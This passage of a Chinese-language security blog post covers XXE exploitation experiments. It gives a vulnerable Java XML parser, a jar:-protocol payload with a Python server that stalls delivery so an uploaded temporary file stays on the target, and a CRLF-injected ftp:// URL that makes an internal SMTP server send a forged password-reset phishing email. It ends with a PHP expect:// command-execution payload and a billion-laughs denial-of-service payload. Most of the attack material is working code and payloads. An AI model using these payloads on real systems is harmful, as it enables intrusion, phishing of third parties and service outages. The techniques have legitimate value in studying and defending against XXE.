<h5 id="下面是我的一些测试过程："><a href="#下面是我的一些测试过程：" class="headerlink" title="下面是我的一些测试过程："></a>下面是我的一些测试过程：</h5><h5 id="我首先在本地模拟一个存在-XXE-的程序，网上找的能直接解析-XML-文件的-java-源码"><a href="#我首先在本地模拟一个存在-XXE-的程序，网上找的能直接解析-XML-文件的-java-源码" class="headerlink" title="我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码"></a>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</h5><h5 id="示例代码：-8"><a href="#示例代码：-8" class="headerlink" title="示例代码："></a>示例代码：</h5><h6 id="xml-test-java"><a href="#xml-test-java" class="headerlink" title="xml_test.java"></a>xml_test.java</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xml_test;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Attr;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Comment;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NamedNodeMap;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhanglong</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xml_test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">        Document doc = db.parse(<span class="keyword">new</span> File(<span class="string">"student.xml"</span>));</span><br><span class="line">        <span class="comment">//获得根元素结点</span></span><br><span class="line">        Element root = doc.getDocumentElement();</span><br><span class="line"></span><br><span class="line">        parseElement(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">parseElement</span><span class="params">(Element element)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String tagName = element.getNodeName();</span><br><span class="line"></span><br><span class="line">        NodeList children = element.getChildNodes();</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">"&lt;"</span> + tagName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断</span></span><br><span class="line">        NamedNodeMap map = element.getAttributes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果该元素存在属性</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">null</span> != map)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; map.getLength(); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//获得该元素的每一个属性</span></span><br><span class="line">                Attr attr = (Attr)map.item(i);</span><br><span class="line"></span><br><span class="line">                String attrName = attr.getName();</span><br><span class="line">                String attrValue = attr.getValue();</span><br><span class="line"></span><br><span class="line">                System.out.print(<span class="string">" "</span> + attrName + <span class="string">"=\""</span> + attrValue + <span class="string">"\""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">"&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; children.getLength(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Node node = children.item(i);</span><br><span class="line">            <span class="comment">//获得结点的类型</span></span><br><span class="line">            <span class="keyword">short</span> nodeType = node.getNodeType();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(nodeType == Node.ELEMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//是元素，继续递归</span></span><br><span class="line">                parseElement((Element)node);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType == Node.TEXT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//递归出口</span></span><br><span class="line">                System.out.print(node.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType == Node.COMMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.print(<span class="string">"&lt;!--"</span>);</span><br><span class="line"></span><br><span class="line">                Comment comment = (Comment)node;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//注释内容</span></span><br><span class="line">                String data = comment.getData();</span><br><span class="line"></span><br><span class="line">                System.out.print(data);</span><br><span class="line"></span><br><span class="line">                System.out.print(<span class="string">"--&gt;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">"&lt;/"</span> + tagName + <span class="string">"&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="有了这个源码以后，我们需要在本地建立一个-xml-文件-，我取名为-student-xml"><a href="#有了这个源码以后，我们需要在本地建立一个-xml-文件-，我取名为-student-xml" class="headerlink" title="有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml"></a>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</h5><h6 id="student-xml"><a href="#student-xml" class="headerlink" title="student.xml"></a>student.xml</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  remote SYSTEM "jar:http://localhost:9999/jar.zip!/wm.php"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">convert</span>&gt;</span>&amp;remote;<span class="tag">&lt;/<span class="name">convert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="目录结构如下图："><a href="#目录结构如下图：" class="headerlink" title="目录结构如下图："></a>目录结构如下图：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png" alt></p>
<h5 id="可以清楚地看到我的请求是向自己本地的-9999-端口发出的，那么9999-端口上有什么服务呢？实际上是我自己用-python-写的一个-TCP-服务器"><a href="#可以清楚地看到我的请求是向自己本地的-9999-端口发出的，那么9999-端口上有什么服务呢？实际上是我自己用-python-写的一个-TCP-服务器" class="headerlink" title="可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器"></a>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</h5><h4 id="示例代码：-9"><a href="#示例代码：-9" class="headerlink" title="示例代码："></a>示例代码：</h4><h5 id="sever-py"><a href="#sever-py" class="headerlink" title="sever.py"></a>sever.py</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">'localhost'</span> </span><br><span class="line">listen_port = <span class="number">9999</span> </span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarRequestHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        http_req = <span class="string">b''</span></span><br><span class="line">        print(<span class="string">'New connection:'</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b'\r\n\r\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                print(<span class="string">'Client req:\r\n'</span>,http_req.decode())</span><br><span class="line">                jf = open(jar_file, <span class="string">'rb'</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">'''HTTP/1.0 200 OK\r\n'''</span></span><br><span class="line">                <span class="string">'''Content-Type: application/java-archive\r\n\r\n'''</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">'ascii'</span>))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:<span class="number">-1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                print(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[<span class="number">-1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"get error at:"</span>+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'waiting for connection...'</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure>

<h5 id="这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个-sleep-30-，这个的目的我后面再说"><a href="#这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个-sleep-30-，这个的目的我后面再说" class="headerlink" title="这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说"></a>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</h5><h5 id="既然是文件上传，那我们又要回到-jar-协议解析文件的过程中了"><a href="#既然是文件上传，那我们又要回到-jar-协议解析文件的过程中了" class="headerlink" title="既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了"></a>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jar 协议处理文件的过程：</span><br><span class="line"></span><br><span class="line">(1) 下载 jar/zip 文件到临时文件中</span><br><span class="line">(2) 提取出我们指定的文件</span><br><span class="line">(3) 删除临时文件</span><br></pre></td></tr></table></figure>

<h5 id="那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的"><a href="#那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的" class="headerlink" title="那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的"></a>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://localhost:9999/jar.zip!/1.php</span><br></pre></td></tr></table></figure>

<h5 id="1-php-在这个-jar-zip-中没有的话，java-解析器就会报错，说在这个临时文件中找不到这个文件"><a href="#1-php-在这个-jar-zip-中没有的话，java-解析器就会报错，说在这个临时文件中找不到这个文件" class="headerlink" title="1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件"></a>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</h5><h5 id="如下图："><a href="#如下图：" class="headerlink" title="如下图："></a>如下图：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png" alt></p>
<h5 id="既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep-）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用-hex-编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题"><a href="#既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep-）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用-hex-编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题" class="headerlink" title="既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题"></a>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</h5><h5 id="下面是我的实验录屏："><a href="#下面是我的实验录屏：" class="headerlink" title="下面是我的实验录屏："></a>下面是我的实验录屏：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif" alt></p>
<h5 id="实验就到这一步了，怎么利用就看各位大佬的了（坏笑）"><a href="#实验就到这一步了，怎么利用就看各位大佬的了（坏笑）" class="headerlink" title="实验就到这一步了，怎么利用就看各位大佬的了（坏笑）"></a>实验就到这一步了，怎么利用就看各位大佬的了（坏笑）</h5><h5 id="在LCTF-2018-出了这样一个CTF题目，详细的-wp-可以看这篇文章"><a href="#在LCTF-2018-出了这样一个CTF题目，详细的-wp-可以看这篇文章" class="headerlink" title="在LCTF 2018 出了这样一个CTF题目，详细的 wp 可以看这篇文章"></a>在LCTF 2018 出了这样一个CTF题目，详细的 wp 可以看<a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">这篇文章</a></h5><h4 id="实验七：钓鱼："><a href="#实验七：钓鱼：" class="headerlink" title="实验七：钓鱼："></a>实验七：钓鱼：</h4><h5 id="如果内网有一台易受攻击的-SMTP-服务器，我们就能利用-ftp-协议结合-CRLF-注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb-的一篇文章-）"><a href="#如果内网有一台易受攻击的-SMTP-服务器，我们就能利用-ftp-协议结合-CRLF-注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb-的一篇文章-）" class="headerlink" title="如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）"></a>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</h5><h5 id="Java支持在sun-net-ftp-impl-FtpClient中的ftp-URI。因此，我们可以指定用户名和密码，例如ftp-user-password-host-port-test-txt，FTP客户端将在连接中发送相应的USER命令。"><a href="#Java支持在sun-net-ftp-impl-FtpClient中的ftp-URI。因此，我们可以指定用户名和密码，例如ftp-user-password-host-port-test-txt，FTP客户端将在连接中发送相应的USER命令。" class="headerlink" title="Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。"></a>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。" target="_blank" rel="noopener">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></h5><h5 id="但是如果我们将-0D-0A-CRLF-添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令："><a href="#但是如果我们将-0D-0A-CRLF-添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：" class="headerlink" title="但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令："></a>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</h5><h5 id="示例代码：-10"><a href="#示例代码：-10" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp://a%0D%0A</span><br><span class="line">EHLO%20a%0D%0A</span><br><span class="line">MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A</span><br><span class="line">RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A</span><br><span class="line">DATA%0D%0A</span><br><span class="line">From%3A%20support%40VULNERABLESYSTEM.com%0A</span><br><span class="line">To%3A%20victim%40gmail.com%0A</span><br><span class="line">Subject%3A%20test%0A</span><br><span class="line">%0A</span><br><span class="line">test!%0A</span><br><span class="line">%0D%0A</span><br><span class="line">.%0D%0A</span><br><span class="line">QUIT%0D%0A</span><br><span class="line">:a@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure>

<h5 id="当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM-com上的邮件服务器："><a href="#当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM-com上的邮件服务器：" class="headerlink" title="当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器："></a>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</h5><h5 id="示例代码：-11"><a href="#示例代码：-11" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ftp://a</span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;</span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure>

<h5 id="这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。"><a href="#这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。" class="headerlink" title="这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。"></a>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</h5><h4 id="实验八：其他："><a href="#实验八：其他：" class="headerlink" title="实验八：其他："></a>实验八：其他：</h4><h5 id="除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下："><a href="#除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：" class="headerlink" title="除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下："></a>除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：</h5><h4 id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a>1.PHP expect RCE</h4><h5 id="由于-PHP-的-expect-并不是默认安装扩展，如果安装了这个expect-扩展我们就能直接利用-XXE-进行-RCE"><a href="#由于-PHP-的-expect-并不是默认安装扩展，如果安装了这个expect-扩展我们就能直接利用-XXE-进行-RCE" class="headerlink" title="由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE"></a>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</h5><h5 id="示例代码：-12"><a href="#示例代码：-12" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;/file&gt;</span><br><span class="line">&lt;/dir&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-利用-XXE-进行-DOS-攻击"><a href="#2-利用-XXE-进行-DOS-攻击" class="headerlink" title="2. 利用 XXE 进行 DOS 攻击"></a>2. 利用 XXE 进行 DOS 攻击</h4><h5 id="示例代码：-13"><a href="#示例代码：-13" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">     &lt;!DOCTYPE lolz [</span><br><span class="line">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">     ]&gt;</span><br><span class="line">     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>

